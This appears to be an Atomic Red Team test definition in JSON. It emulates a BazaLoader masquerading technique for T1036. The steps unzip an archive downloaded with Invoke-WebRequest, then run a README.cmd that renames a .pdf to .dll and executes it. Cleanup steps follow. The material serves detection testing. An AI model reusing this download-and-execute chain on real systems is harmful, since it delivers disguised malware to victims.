{
  "id": "4449c89b-ec82-43a4-89c1-91e2f1abeecc",
  "name": "Malware Masquerading and Execution from Zip File",
  "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "a78bbcec-48e7-49b6-9dbd-91167db71daa",
      "type": "execute-command",
      "data": {
        "command": "Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" \u003e$null 2\u003e$null",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "0851e956-bd1b-4126-bda6-ac4746374578",
      "type": "execute-command",
      "data": {
        "command": "taskkill /IM Calculator.exe /f \u003e$null 2\u003e$null\nRemove-Item \"$env:userprofile\\Downloads\\T1036\" -recurse -ErrorAction Ignore",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "0da789ea-2159-4c1a-ae3f-7b94d61db123",
      "name": "Check dependency 1/1",
      "description": "Zip file must be present.",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d8ff9bb0-b96f-4c99-8e78-9589954b1c16",
      "name": "Resolve dependency 1/1",
      "description": "Zip file must be present.",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest #{url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" \n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4ec32634-0a43-4c85-853c-fd71451e2c7d",
      "name": "Re-check dependency 1/1",
      "description": "Zip file must be present.",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a78bbcec-48e7-49b6-9dbd-91167db71daa",
      "p": "on-success",
      "o": "0851e956-bd1b-4126-bda6-ac4746374578"
    },
    {
      "s": "a78bbcec-48e7-49b6-9dbd-91167db71daa",
      "p": "on-failure",
      "o": "0851e956-bd1b-4126-bda6-ac4746374578"
    },
    {
      "s": "0da789ea-2159-4c1a-ae3f-7b94d61db123",
      "p": "on-success",
      "o": "a78bbcec-48e7-49b6-9dbd-91167db71daa"
    },
    {
      "s": "0da789ea-2159-4c1a-ae3f-7b94d61db123",
      "p": "on-failure",
      "o": "d8ff9bb0-b96f-4c99-8e78-9589954b1c16"
    },
    {
      "s": "d8ff9bb0-b96f-4c99-8e78-9589954b1c16",
      "p": "on-success",
      "o": "4ec32634-0a43-4c85-853c-fd71451e2c7d"
    },
    {
      "s": "4ec32634-0a43-4c85-853c-fd71451e2c7d",
      "p": "on-failure",
      "o": "a78bbcec-48e7-49b6-9dbd-91167db71daa"
    }
  ],
  "tags": [
    "T1036",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "url",
      "type": "url",
      "description": "Location of zip file",
      "value": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip"
    }
  ]
}